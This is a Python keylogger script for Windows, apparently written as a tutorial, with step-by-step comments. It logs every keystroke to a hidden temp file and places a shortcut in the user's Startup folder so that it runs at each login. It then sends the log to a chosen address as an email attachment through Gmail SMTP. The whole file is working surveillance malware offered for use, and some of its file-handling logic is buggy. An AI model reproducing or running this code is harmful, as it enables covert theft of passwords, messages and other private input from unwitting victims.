#first import all necessary packages
from pynput.keyboard import Key, Listener
import os
import shutil
import datetime
import winshell
from win32com.client import Dispatch
import tempfile
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
import threading
import socket

#first make an folder in temp
save = tempfile.mkdtemp("screen")
#print(save) #just printing the path to find out the actual path of temp
cwd = os.getcwd() #it returns current working directory
source = os.listdir() #gives list of files in current directory

#first we use datetime module to get current system-date and time base on that we save the file name
dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")
#now save filename with the datetime and also mention the temp folder path
filename = save+"\key_log"+dateAndtime+".txt"
open(filename,"w+")#w+ use to create the file which does not exist, creates a new file for writing.
keys=[]#use this list to store the keyboard inputs
count = 0 #used for Enther into sendmail function
countInternet = 0
word = "Key."#use to match with keyboards keys
username = os.getlogin() #looks for current username

# now first we have to create shortcut of file and store into windows startup folder
# so first create a destination path
destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)

#now write the main method for creating shortcut file in startup folder
def main():
    path = os.path.join(destination, "keylogger.pyw - Shortcut.lnk")#here set the path along it's name 7 extension
    #now we have to set the link file source
    target = r""+cwd+"\keylogger.pyw"
    #now set the current file icon for it
    icon = r""+cwd+"\keylogger.pyw"
    for files in source:
        if files == "keylogger.pyw":
            #here we have to pass all objects we are created for sent icon,path & target etc
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()


#it's done let's call it by writing funcation name
#we also look for it currently exit in startup folder or not
shortcut = 'keylogger.pyw - Shortcut.lnk'
if shortcut in destination:
    pass
else:
    main()

# also write the function to check internet connection
# so it help to call sendmail function when internet is wroking
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

# now write a function to send an email with an attachment
def send_email():
    # first enable the less secure app persmission of sender email address.
    # I'll provide link of secure app persmission in video desciption.
    fromaddr = "enter sender email address"
    toaddr = "enter receiver email address"
    # instance of MIMEMultipart 
    msg = MIMEMultipart()
    # storing the senders email address   
    msg['From'] = fromaddr
    # storing the receivers email address 
    msg['To'] = toaddr
    # storing the subject 
    msg['Subject'] = "data"
    # string to store the body of the mail 
    body = "TEXT YOU WANT TO SEND"
    # attach the body with the msg instance 
    msg.attach(MIMEText(body, 'plain'))
    # open the file to be sent  
    attachment = open(filename, "rb")
    # instance of MIMEBase and named as part
    part = MIMEBase('application', 'octet-stream')
    # To change the payload into encoded form 
    part.set_payload((attachment).read())
    # encode into base64 
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    # attach the instance 'part' to instance 'msg' 
    msg.attach(part)
    # creates SMTP session
    server = smtplib.SMTP('smtp.gmail.com', 587)
    # start TLS for security 
    server.starttls()
    # Authentication 
    server.login(fromaddr, "enter sender email id password")
    # Converts the Multipart msg into a string 
    text = msg.as_string()
    # sending the mail 
    server.sendmail(fromaddr, toaddr, text)
    # terminating the session 
    server.quit()

#now write the write_file method which
def write_file(keys):
    with open(filename,"a") as f:
        for key in keys:#we look for its keys and base on that perform an actions.
            if key == 'Key.enter':#for enter it write a new line.
                f.write("\n")
            elif key == 'Key.space':#for space it will enter a space
                f.write(key.replace("Key.space"," "))
            elif key == 'Key.backspace':#for backspace it will enter a $
                f.write(key.replace("Key.backspace","$")) # EX. well$come --> welcome (Actual word) , another example hellll$$$o --> helo (actual word) [hope it helps you to understand]
            elif key[:4] == word:#for others we just pass no need to store
                pass
            else:#else for remaning words we write into the file.
                f.write(key.replace("'",""))


# now write an function which takes key as a parameter
def on_press(key):
    global keys, count, countInternet, filename
    # now append key into list as a string
    keys.append(str(key))
    # and check list length base on length of list we write an key into txt file
    if len(keys) > 10:
        #here call write_file a function which takes list (keys) as a parament
        write_file(keys)
        # now write an if else condition to check internet connection and if its true then call the sendmail function.
        if is_connected():
            count += 1 #we are going to increment so so once its reach to 100 its called the sendmail function
            #print('connected {}'.format(count))#just printing to monitor counting
            if count > 100:
                count = 0 # make it  zero again so its start from begining
                #now call the sendmail function by Thread bcoz it take time and we don't want to miss user keyboard input.
                t1 = threading.Thread(target=send_email, name='t1')
                t1.start()#now call by start
        else:
            # else condition exec when internet connection is not working
            countInternet += 1
            # printing the status for monitor
            #print('not connected',countInternet)
            # once internet connection is not working then it will not send file to email
            # now we have to copy file from temp folder to current directory so it is easily accessible instead of looking in temp folder manually
            if countInternet > 10:
                countInternet = 0
                filename = filename.strip(save) # here we strip the path only and get file name
                # now look for txt file in temp folder
                for files in save:
                    if files == filename:
                        shutil.copy(files+"t",source)#when we strip the path but it also strip the last letter 't' from extension so add it once again.

        #and end of if else block consition clear the list so its ready to capture/save other keys.       
        keys.clear()


#write an instance of Listener and define the on_press method in a with statement and then join the instance to the main thread.
with Listener(on_press=on_press) as listener:
    listener.join()

#that's it
